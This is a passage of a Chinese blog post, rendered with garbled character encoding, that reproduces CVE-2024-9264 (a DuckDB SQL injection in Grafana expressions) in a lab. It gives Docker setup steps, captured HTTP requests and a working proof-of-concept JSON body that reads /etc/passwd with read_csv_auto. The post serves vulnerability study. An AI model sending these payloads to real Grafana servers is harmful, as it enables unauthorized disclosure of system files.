è®¿é—®æœåŠ¡</h3><p>æµè§ˆå™¨è¾“å…¥IP:3000è¿›è¡Œç™»å½•<br>        é»˜è®¤ç”¨æˆ·å¯†ç ï¼šadmin/admin</p><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-09%2013.57.27.png" alt="æœ¬æœºæµ‹è¯•" style="zoom:40%;"><p>ã€æœ¬æœºæµ‹è¯•ï¼Œè®¿é—®æˆåŠŸï¼ã€‘</p><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-09%2013.58.24.png" alt="å±€åŸŸç½‘æµ‹è¯•" style="zoom:30%;"><p>ã€å±€åŸŸç½‘æµ‹è¯•ï¼Œè®¿é—®æˆåŠŸï¼ã€‘</p><p>ç¬¬ä¸€æ¬¡ç™»å½•ä¹‹åä¼šå¼ºåˆ¶ä¿®æ”¹å¯†ç ï¼ˆæ¯•ç«Ÿadmin/adminå¤ªå¼±äº†ï¼‰ã€‚</p><h2 id="1-3-Dockeréƒ¨ç½²"><a href="#1-3-Dockeréƒ¨ç½²" class="headerlink" title="1.3 Dockeréƒ¨ç½²"></a>1.3 Dockeréƒ¨ç½²</h2><ul><li>ä¸‹é¢æä¾›å¦å¤–ä¸€ç§Dockeréƒ¨ç½²çš„æ–¹æ³•ä¾›å‚è€ƒï¼š</li></ul><p>ä½¿ç”¨ Grafana 11.0.0 æ„å»ºç¯å¢ƒï¼Œå®‰è£…  <code>duckdb</code> äºŒè¿›åˆ¶æ–‡ä»¶å¹¶å°†å…¶æ·»åŠ åˆ° Grafana çš„ <code>$PATH</code> ä¸­ã€‚</p><p>ä¸‹è½½ <a href="https://github.com/duckdb/duckdb/releases/download/v0.8.1/duckdb_cli-linux-amd64.zip">duckdb_cli-linux-amd64.zip</a>ï¼Œä¸ Dockerfileã€docker-compose.yml æ”¾ç½®åœ¨åŒä¸€ç›®å½•ã€‚</p><p>Dockerfile</p><pre class="line-numbers language-docker" data-language="docker"><code class="language-docker"><span class="token instruction"><span class="token keyword">FROM</span> grafana/grafana:11.0.0-ubuntu</span><span class="token instruction"><span class="token keyword">USER</span> root</span><span class="token comment"># Install DuckDB</span><span class="token instruction"><span class="token keyword">COPY</span> duckdb_cli-linux-amd64.zip /tmp/</span><span class="token instruction"><span class="token keyword">RUN</span> apt-get update &amp;&amp; apt-get install -y &amp;&amp; apt-get install unzip -y</span>    &amp;&amp; unzip /tmp/duckdb_cli-linux-amd64.zip -d /usr/local/bin/ \    &amp;&amp; chmod +x /usr/local/bin/duckdb \    &amp;&amp; rm /tmp/duckdb_cli-linux-amd64.zip<span class="token comment"># Add DuckDB to the PATH</span><span class="token instruction"><span class="token keyword">ENV</span> PATH=<span class="token string">"/usr/local/bin:${PATH}"</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>docker-compose.yml</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">services</span><span class="token punctuation">:</span>  <span class="token key atrule">mysql</span><span class="token punctuation">:</span>    <span class="token key atrule">image</span><span class="token punctuation">:</span> mysql<span class="token punctuation">:</span>latest    <span class="token key atrule">restart</span><span class="token punctuation">:</span> always    <span class="token key atrule">environment</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> MYSQL_ROOT_PASSWORD=rootpassword      <span class="token punctuation">-</span> MYSQL_DATABASE=grafanadb      <span class="token punctuation">-</span> MYSQL_USER=grafana      <span class="token punctuation">-</span> MYSQL_PASSWORD=grafanapassword    <span class="token key atrule">volumes</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> ./mysql<span class="token punctuation">-</span>data<span class="token punctuation">:</span>/var/lib/mysql    <span class="token key atrule">ports</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> <span class="token string">"3306:3306"</span>    <span class="token key atrule">healthcheck</span><span class="token punctuation">:</span>      <span class="token key atrule">test</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"CMD"</span><span class="token punctuation">,</span> <span class="token string">"mysqladmin"</span><span class="token punctuation">,</span> <span class="token string">"ping"</span><span class="token punctuation">,</span> <span class="token string">"-h"</span><span class="token punctuation">,</span> <span class="token string">"localhost"</span><span class="token punctuation">]</span>      <span class="token key atrule">interval</span><span class="token punctuation">:</span> 10s      <span class="token key atrule">timeout</span><span class="token punctuation">:</span> 5s      <span class="token key atrule">retries</span><span class="token punctuation">:</span> <span class="token number">3</span>    <span class="token key atrule">grafana</span><span class="token punctuation">:</span>    <span class="token key atrule">build</span><span class="token punctuation">:</span> .    <span class="token key atrule">ports</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> <span class="token string">"3000:3000"</span>    <span class="token key atrule">environment</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> GF_SECURITY_ADMIN_PASSWORD=abc123<span class="token tag">!</span>      <span class="token punctuation">-</span> GF_DATABASE_TYPE=mysql      <span class="token punctuation">-</span> GF_DATABASE_HOST=mysql<span class="token punctuation">:</span><span class="token number">3306</span>      <span class="token punctuation">-</span> GF_DATABASE_USER=grafana      <span class="token punctuation">-</span> GF_DATABASE_PASSWORD=grafanapassword      <span class="token punctuation">-</span> GF_DATABASE_NAME=grafanadb    <span class="token key atrule">volumes</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> grafana<span class="token punctuation">-</span>storage<span class="token punctuation">:</span>/var/lib/grafana      <span class="token punctuation">-</span> ./grafana.ini<span class="token punctuation">:</span>/etc/grafana/grafana.ini    <span class="token key atrule">depends_on</span><span class="token punctuation">:</span>        <span class="token key atrule">mysql</span><span class="token punctuation">:</span>         <span class="token key atrule">condition</span><span class="token punctuation">:</span> service_healthy  <span class="token key atrule">volumes</span><span class="token punctuation">:</span>  <span class="token key atrule">grafana-storage</span><span class="token punctuation">:</span>  mysql<span class="token punctuation">-</span>storage<span class="token punctuation">:</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å½“å‰ç›®å½•æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œå¯åŠ¨ä¸€ä¸ª Grafana 11.0.0 ç¯å¢ƒï¼š</p><pre class="line-numbers language-none"><code class="language-none">docker build -t grafana:11.0.0 .docker-compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ç¯å¢ƒå¯åŠ¨åï¼Œè®¿é—® <code>http://your-ip:3000</code> å³å¯æŸ¥çœ‹åˆ°ç®¡ç†åå°ã€‚ç”±äºé…ç½®äº†å¯†ç ï¼Œéœ€è¦ä½¿ç”¨ <code>admin/abc123!</code> ç™»å½•ç®¡ç†åå°ã€‚</p><h1 id="äºŒã€æ¼æ´å¤ç°"><a href="#äºŒã€æ¼æ´å¤ç°" class="headerlink" title="äºŒã€æ¼æ´å¤ç°"></a>äºŒã€æ¼æ´å¤ç°</h1><h2 id="2-1-æ¼æ´æ¦‚è¿°"><a href="#2-1-æ¼æ´æ¦‚è¿°" class="headerlink" title="2.1 æ¼æ´æ¦‚è¿°"></a>2.1 æ¼æ´æ¦‚è¿°</h2><p>Grafana çš„ä¸€ä¸ªå®éªŒæ€§ SQL è¡¨è¾¾å¼åŠŸèƒ½ä¸­å­˜åœ¨ä¸€ä¸ª DuckDB SQL æ³¨å…¥æ¼æ´ã€‚</p><p>ä»»ä½•<strong>ç»è¿‡èº«ä»½éªŒè¯</strong>çš„ç”¨æˆ·éƒ½å¯ä»¥é€šè¿‡ä¿®æ”¹ Grafana ä»ªè¡¨æ¿ä¸­çš„è¡¨è¾¾å¼æ‰§è¡Œä»»æ„ DuckDB SQL æŸ¥è¯¢ã€‚</p><blockquote><p>ä»€ä¹ˆæ˜¯DuckDBï¼Ÿ</p><p>DuckDBæ˜¯ä¸€ä¸ªè½»é‡çº§ã€åµŒå…¥å¼çš„SQL OLAPæ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼Œæ—¨åœ¨æä¾›é«˜æ€§èƒ½çš„æ•°æ®åˆ†æã€‚å®ƒæ”¯æŒæ ‡å‡†SQLï¼Œå…è®¸åœ¨åº”ç”¨ç¨‹åºå†…éƒ¨å¤„ç†æ•°æ®ï¼Œæ— éœ€å¤–éƒ¨æ•°æ®åº“æœåŠ¡å™¨ã€‚DuckDBä¼˜åŒ–äº†å†…å­˜ä½¿ç”¨ï¼Œé€šè¿‡åˆ—å­˜å‚¨å’Œæ•°æ®å‹ç¼©æŠ€æœ¯ï¼Œæé«˜äº†æ•°æ®è®¿é—®é€Ÿåº¦å’ŒæŸ¥è¯¢æ•ˆç‡ã€‚æ­¤å¤–ï¼Œå®ƒè¿˜å…·å¤‡è·¨å¹³å°å…¼å®¹æ€§ï¼Œæ”¯æŒWindowsã€Linuxå’ŒmacOSï¼Œä½¿å¾—å¼€å‘è€…å¯ä»¥åœ¨å¤šç§æ“ä½œç³»ç»Ÿä¸Šéƒ¨ç½²å’Œä½¿ç”¨ã€‚DuckDBçš„å¼€æºç‰¹æ€§ä¹Ÿä½¿å…¶æ˜“äºæ‰©å±•å’Œå®šåˆ¶ï¼Œæ»¡è¶³ç‰¹å®šéœ€æ±‚ã€‚</p></blockquote><p>åˆ©ç”¨æ¡ä»¶ï¼š</p><ol><li><p>æœ‰è´¦å·å¯†ç ï¼Œå¯ä»¥ç™»é™†. </p></li><li><p>æœåŠ¡å™¨å®‰è£…äº†duckDB.ï¼ˆé»˜è®¤æ²¡å®‰è£…ï¼‰</p></li><li><p>ä½¿ç”¨æœ‰æ¼æ´çš„ç‰ˆæœ¬.</p></li></ol><h2 id="2-2-æ¼æ´ä½ç½®"><a href="#2-2-æ¼æ´ä½ç½®" class="headerlink" title="2.2 æ¼æ´ä½ç½®"></a>2.2 æ¼æ´ä½ç½®</h2><p>æ¼æ´ç‚¹åœ¨ä»ªè¡¨ç›˜åˆ›å»ºå¤„ã€‚è¿™é‡Œå¯ä»¥è¾“å…¥è¡¨è¾¾å¼ï¼Œæ‰§è¡Œä¸€äº›å‡½æ•°å‘½ä»¤ã€‚</p><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-23%2011.30.43.png" style="zoom:50%;"><h2 id="2-3-æŠ“åŒ…åˆ†æ"><a href="#2-3-æŠ“åŒ…åˆ†æ" class="headerlink" title="2.3 æŠ“åŒ…åˆ†æ"></a>2.3 æŠ“åŒ…åˆ†æ</h2><p>åœ¨Expressionå¤„è¾“å…¥å†…å®¹testå¹¶å›è½¦ï¼ŒBPæŠ“åˆ°çš„è¯·æ±‚åŒ…å†…å®¹å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">POST /api/ds/query?ds_type<span class="token operator">=</span>__expr__<span class="token operator">&amp;</span><span class="token assign-left variable">expression</span><span class="token operator">=</span>true<span class="token operator">&amp;</span><span class="token assign-left variable">requestId</span><span class="token operator">=</span>Q102 HTTP/1.1Host: <span class="token number">192.168</span>.155.31:3000User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Macintosh<span class="token punctuation">;</span> Intel Mac OS X <span class="token number">10.15</span><span class="token punctuation">;</span> rv:134.0<span class="token punctuation">)</span> Gecko/20100101 Firefox/134.0Accept: application/json, text/plain, */*Accept-Language: zh-CN,zh<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.8</span>,zh-TW<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.7</span>,zh-HK<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.5</span>,en-US<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.3</span>,en<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.2</span>Accept-Encoding: gzip, deflateReferer: http://192.168.155.31:3000/dashboard/new?orgId<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token assign-left variable">editPanel</span><span class="token operator">=</span><span class="token number">1</span>content-type: application/jsonx-datasource-uid: grafanax-grafana-device-id: 619ca89a5f27e3a3f1bd260aead26594x-grafana-from-expr: <span class="token boolean">true</span>x-grafana-org-id: <span class="token number">1</span>x-panel-id: <span class="token number">1</span>x-panel-plugin-id: timeseriesx-plugin-id: datasourceContent-Length: <span class="token number">350</span>Origin: http://192.168.155.31:3000Connection: closeCookie: <span class="token assign-left variable">grafana_session</span><span class="token operator">=</span>86e5a674ff2f29d015081887dbebfa42<span class="token punctuation">;</span> <span class="token assign-left variable">grafana_session_expiry</span><span class="token operator">=</span><span class="token number">1734931671</span>Priority: <span class="token assign-left variable">u</span><span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">{</span><span class="token string">"queries"</span><span class="token builtin class-name">:</span><span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token string">"queryType"</span><span class="token builtin class-name">:</span><span class="token string">"randomWalk"</span>,<span class="token string">"datasource"</span>:<span class="token punctuation">{</span><span class="token string">"uid"</span><span class="token builtin class-name">:</span><span class="token string">"grafana"</span>,<span class="token string">"type"</span><span class="token builtin class-name">:</span><span class="token string">"datasource"</span><span class="token punctuation">}</span>,<span class="token string">"refId"</span><span class="token builtin class-name">:</span><span class="token string">"A"</span>,<span class="token string">"datasourceId"</span>:-1,<span class="token string">"intervalMs"</span>:20000,<span class="token string">"maxDataPoints"</span>:1059<span class="token punctuation">}</span>,<span class="token punctuation">{</span><span class="token string">"refId"</span><span class="token builtin class-name">:</span><span class="token string">"B"</span>,<span class="token string">"datasource"</span>:<span class="token punctuation">{</span><span class="token string">"type"</span><span class="token builtin class-name">:</span><span class="token string">"__expr__"</span>,<span class="token string">"uid"</span><span class="token builtin class-name">:</span><span class="token string">"__expr__"</span>,<span class="token string">"name"</span><span class="token builtin class-name">:</span><span class="token string">"Expression"</span><span class="token punctuation">}</span>,<span class="token string">"type"</span><span class="token builtin class-name">:</span><span class="token string">"math"</span>,<span class="token string">"hide"</span>:false,<span class="token string">"expression"</span><span class="token builtin class-name">:</span><span class="token string">"test<span class="token entity" title="\n">\n</span>"</span>,<span class="token string">"window"</span><span class="token builtin class-name">:</span><span class="token string">""</span><span class="token punctuation">}</span><span class="token punctuation">]</span>,<span class="token string">"from"</span><span class="token builtin class-name">:</span><span class="token string">"1734909521360"</span>,<span class="token string">"to"</span><span class="token builtin class-name">:</span><span class="token string">"1734931121360"</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å“åº”å†…å®¹ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">HTTP/1.1 <span class="token number">500</span> Internal Server ErrorCache-Control: no-storeContent-Type: application/jsonX-Content-Type-Options: nosniffX-Frame-Options: denyX-Xss-Protection: <span class="token number">1</span><span class="token punctuation">;</span> <span class="token assign-left variable">mode</span><span class="token operator">=</span>blockDate: Mon, <span class="token number">23</span> Dec <span class="token number">2024</span> 05:19:14 GMTContent-Length: <span class="token number">43</span>Connection: close<span class="token punctuation">{</span><span class="token string">"message"</span><span class="token builtin class-name">:</span><span class="token string">"Query data error"</span>,<span class="token string">"traceID"</span><span class="token builtin class-name">:</span><span class="token string">""</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-23%2013.19.30.png" alt="æˆªå±2024-12-23 13.19.30"></p><h2 id="2-4-æ¼æ´åˆæ­¥æµ‹è¯•"><a href="#2-4-æ¼æ´åˆæ­¥æµ‹è¯•" class="headerlink" title="2.4 æ¼æ´åˆæ­¥æµ‹è¯•"></a>2.4 æ¼æ´åˆæ­¥æµ‹è¯•</h2><p>ä¿®æ”¹expressionå‚æ•°ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token string">"expression"</span><span class="token builtin class-name">:</span><span class="token string">"SELECT * FROM read_blob('/etc/passwd');<span class="token entity" title="\n">\n</span>"</span>,<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æŠ¥é”™ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">{</span><span class="token string">"message"</span><span class="token builtin class-name">:</span><span class="token string">"Data source not found"</span>,<span class="token string">"traceID"</span><span class="token builtin class-name">:</span><span class="token string">""</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¹¶æ²¡æœ‰è·å¾—é¢„æœŸçš„/etc/passwdçš„å†…å®¹ã€‚</p><p>å°è¯•å…¶ä»–æ–¹æ³•ä¹Ÿä¸è¡Œã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token string">"expression"</span><span class="token builtin class-name">:</span> <span class="token string">"SELECT * FROM read_csv_auto('/etc/passwd');"</span>,<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ ¹æ®æç¤ºï¼Œç¼ºä¹ç›¸åº”çš„æ•°æ®æºã€‚</p><h2 id="2-5-å®‰è£…DuckDB"><a href="#2-5-å®‰è£…DuckDB" class="headerlink" title="2.5 å®‰è£…DuckDB"></a>2.5 å®‰è£…DuckDB</h2><p>éœ€è¦ç‰¹åˆ«æ³¨æ„âš ï¸ï¼š</p><ul><li><p>è¯¥æ¼æ´æ˜¯çœŸå¯¹DuckDBçš„sqlæ³¨å…¥ï¼Œæ‰€ä»¥åˆ©ç”¨æ¡ä»¶é™¤äº†å®‰è£…grafanaä¹‹å¤–ï¼Œè¿˜éœ€è¦å®‰è£…duckDBï¼Œåç»­åˆ›å»ºä»ªè¡¨ç›˜çš„æ—¶å€™é€‰æ‹©DuckDBæ•°æ®æºã€‚</p></li><li><p><code>duckdb</code> äºŒè¿›åˆ¶æ–‡ä»¶å¿…é¡»å­˜åœ¨äº Grafana çš„ <code>$PATH</code> ä¸­ï¼Œæ­¤æ”»å‡»æ‰èƒ½æˆåŠŸï¼›é»˜è®¤æƒ…å†µä¸‹ï¼Œæ­¤äºŒè¿›åˆ¶æ–‡ä»¶æœªå®‰è£…åœ¨ Grafana å‘è¡Œç‰ˆä¸­ã€‚</p></li></ul><h3 id="2-5-1-ä¸‹è½½å®‰è£…åŒ…"><a href="#2-5-1-ä¸‹è½½å®‰è£…åŒ…" class="headerlink" title="2.5.1 ä¸‹è½½å®‰è£…åŒ…"></a>2.5.1 ä¸‹è½½å®‰è£…åŒ…</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> https://github.com/duckdb/duckdb/releases/download/v0.8.1/duckdb_cli-linux-amd64.zip<span class="token function">unzip</span> duckdb_cli-linux-amd64.zip<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-23%2014.23.46.png" alt="æˆªå±2024-12-23 14.23.46"></p><p>è§£å‹ä¹‹åå³å¯è¿è¡Œã€‚</p><h3 id="2-5-2-è§£å‹ä½¿ç”¨"><a href="#2-5-2-è§£å‹ä½¿ç”¨" class="headerlink" title="2.5.2 è§£å‹ä½¿ç”¨"></a>2.5.2 è§£å‹ä½¿ç”¨</h3><p>æ‰§è¡Œ./duckdbå³å¯è¿›å…¥æ•°æ®åº“ã€‚</p><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-23%2014.25.02.png" style="zoom:50%;"><p>æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤å³å¯æŸ¥çœ‹æœ¬åœ°æ–‡ä»¶ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">SELECT * FROM read_csv_auto<span class="token punctuation">(</span><span class="token string">'/etc/passwd'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-23%2014.25.48.png" style="zoom:50%;"><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-23%2014.28.07.png" style="zoom:50%;"><p>èƒ½å¤ŸæŸ¥è¯¢åˆ°æœ¬åœ°çš„æ•æ„Ÿæ–‡ä»¶ã€‚</p><p>æ‰€ä»¥å¦‚æœgrafanaçš„è¡¨è¾¾å¼å¦‚æœæœªç»è¿‡æ»¤ç›´æ¥äº¤ç»™duckDBæ‰§è¡Œï¼Œå°±ä¼šå­˜åœ¨è¯»åŒºæ•æ„Ÿæ–‡ä»¶çš„é£é™©ã€‚</p><h3 id="2-5-3-ç›´æ¥å®‰è£…åˆ°-usr-local-bin-å¹¶è®¾ç½®PATHç¯å¢ƒå˜é‡"><a href="#2-5-3-ç›´æ¥å®‰è£…åˆ°-usr-local-bin-å¹¶è®¾ç½®PATHç¯å¢ƒå˜é‡" class="headerlink" title="2.5.3 ç›´æ¥å®‰è£…åˆ°/usr/local/bin/ å¹¶è®¾ç½®PATHç¯å¢ƒå˜é‡"></a>2.5.3 ç›´æ¥å®‰è£…åˆ°/usr/local/bin/ å¹¶è®¾ç½®PATHç¯å¢ƒå˜é‡</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">unzip</span> /tmp/duckdb_cli-linux-amd64.zip <span class="token parameter variable">-d</span> /usr/local/bin/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-23%2014.32.15.png" style="zoom:50%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>base<span class="token punctuation">)</span> sxk@sxk-ubuntu22:~/Desktop$ <span class="token builtin class-name">echo</span> <span class="token environment constant">$PATH</span>/home/sxk/anaconda3/bin:/home/sxk/anaconda3/condabin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>/usr/local/binå·²ç»åœ¨PATHä¸­äº†ï¼Œå¦‚æœä¸åœ¨éœ€è¦æŒ‰ç…§å¦‚ä¸‹æ–¹æ³•è®¾ç½®ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">é€šè¿‡ä¿®æ”¹profileæ–‡ä»¶:<span class="token function">vim</span> /etc/profile<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>/usr/local/bin:<span class="token environment constant">$PATH</span>ç”Ÿæ•ˆæ–¹æ³•ï¼šç³»ç»Ÿé‡å¯æœ‰æ•ˆæœŸé™ï¼šæ°¸ä¹…æœ‰æ•ˆç”¨æˆ·å±€é™ï¼šå¯¹æ‰€æœ‰ç”¨æˆ·<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-6-POCæµ‹è¯•ï¼ŒæˆåŠŸè¯»å–åˆ°-etc-passwdçš„æ•°æ®"><a href="#2-6-POCæµ‹è¯•ï¼ŒæˆåŠŸè¯»å–åˆ°-etc-passwdçš„æ•°æ®" class="headerlink" title="2.6 POCæµ‹è¯•ï¼ŒæˆåŠŸè¯»å–åˆ°/etc/passwdçš„æ•°æ®"></a>2.6 POCæµ‹è¯•ï¼ŒæˆåŠŸè¯»å–åˆ°/etc/passwdçš„æ•°æ®</h2><p>æŠ“åŒ…ä¹‹åï¼Œç”¨ä¸‹é¢çš„POCæ›¿æ¢POSTæ•°æ®ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">{</span>  <span class="token string">"from"</span><span class="token builtin class-name">:</span> <span class="token string">"1696154400000"</span>,  <span class="token string">"to"</span><span class="token builtin class-name">:</span> <span class="token string">"1696345200000"</span>,  <span class="token string">"queries"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span>    <span class="token punctuation">{</span>      <span class="token string">"datasource"</span><span class="token builtin class-name">:</span> <span class="token punctuation">{</span>        <span class="token string">"name"</span><span class="token builtin class-name">:</span> <span class="token string">"Expression"</span>,        <span class="token string">"type"</span><span class="token builtin class-name">:</span> <span class="token string">"__expr__"</span>,        <span class="token string">"uid"</span><span class="token builtin class-name">:</span> <span class="token string">"__expr__"</span>      <span class="token punctuation">}</span>,      <span class="token string">"expression"</span><span class="token builtin class-name">:</span> <span class="token string">"SELECT * FROM read_csv_auto('/etc/passwd');"</span>,      <span class="token string">"hide"</span><span class="token builtin class-name">:</span> false,      <span class="token string">"refId"</span><span class="token builtin class-name">:</span> <span class="token string">"B"</span>,      <span class="token string">"type"</span><span class="token builtin class-name">:</span> <span class="token string">"sql"</span>,      <span class="token string">"window"</span><span class="token builtin class-name">:</span> <span class="token string">""</span>    <span class="token punctuation">}</span>  <span class="token punctuation">]</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-23%2014.45.08.png" style="zoom:50%;"><p>æŠ“åŒ…é‡æ”¾ï¼Œä¿®æ”¹expressionçš„å†…å®¹ï¼ŒæˆåŠŸè·å–åˆ°/etc/passwdæ•æ„Ÿæ•°æ®ã€‚</p><h1 id="ä¸‰ã€ä»£ç å®¡è®¡"><a href="#ä¸‰ã€ä»£ç å®¡è®¡" class="headerlink" title="ä¸‰ã€ä»£ç å®¡è®¡"></a>ä¸‰ã€ä»£ç å®¡è®¡</h1><h2 id="3-1-è·å–æºä»£ç "><a href="#3-1-è·å–æºä»£ç " class="headerlink" title="3.1 è·å–æºä»£ç "></a>3.1 è·å–æºä»£ç </h2><p><a href="https://github.com/grafana/grafana/releases?q=11.1.0&amp;expanded=true">https://github.com/grafana/grafana/releases?q=11.1.0&amp;expanded=true</a></p><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-23%2015.27.22.png" style="zoom:50%;"><h2 id="3-2-ä»£ç å®¡è®¡"><a href="#3-2-ä»£ç å®¡è®¡" class="headerlink" title="3.2 ä»£ç å®¡è®¡"></a>3.2 ä»£ç å®¡è®¡</h2><h3 id="3-2-1-æ ¹æ®APIè·¯ç”±å®šä½åç«¯ä»£ç "><a href="#3-2-1-æ ¹æ®APIè·¯ç”±å®šä½åç«¯ä»£ç " class="headerlink" title="3.2.1 æ ¹æ®APIè·¯ç”±å®šä½åç«¯ä»£ç "></a>3.2.1 æ ¹æ®APIè·¯ç”±å®šä½åç«¯ä»£ç </h3><p>åœ¨æºä»£ç æ–‡ä»¶ä¸­æœç´¢/api/ds/queryï¼Œå¯ä»¥çœ‹åˆ°å¤„ç†è¡¨è¾¾å¼çš„ä»£ç ã€‚</p><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-23%2016.12.54.png" alt="æˆªå±2024-12-23 16.12.54" style="zoom:50%;"><blockquote><p>goä¸­çš„:=</p><p>åœ¨Goè¯­è¨€ä¸­ï¼Œ<code>:=</code> æ˜¯ä¸€ä¸ªçŸ­å˜é‡å£°æ˜æ“ä½œç¬¦ï¼Œç”¨äºåœ¨å‡½æ•°å†…éƒ¨å£°æ˜å¹¶åˆå§‹åŒ–å±€éƒ¨å˜é‡ã€‚å®ƒç»“åˆäº†å˜é‡å£°æ˜å’Œå€¼èµ‹å€¼çš„æ“ä½œã€‚å¦‚æœå˜é‡ä¹‹å‰æ²¡æœ‰è¢«å£°æ˜è¿‡ï¼Œ<code>:=</code> 